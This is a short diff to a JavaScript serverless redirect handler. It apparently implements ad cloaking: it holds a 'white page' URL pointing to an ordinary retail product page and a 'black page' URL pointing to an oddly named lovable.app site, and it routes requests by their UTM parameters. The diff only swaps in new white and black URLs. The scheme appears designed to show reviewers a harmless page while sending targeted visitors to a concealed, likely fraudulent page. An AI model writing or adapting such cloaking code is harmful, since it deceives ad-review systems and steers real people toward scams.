@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.dorigine.de/en/products/osterreich?srsltid=AfmBOopggc2UwHmwYqCYJymH0urk20yAc0EbvPLdLWEn0kv0hgjQfWae";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://www.hobbyco.com.au/products/3d-modeling-painting-kit-30x40cm-fashion-corgi";
+    const blackPageURL = "https://lucurfreeeccssh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
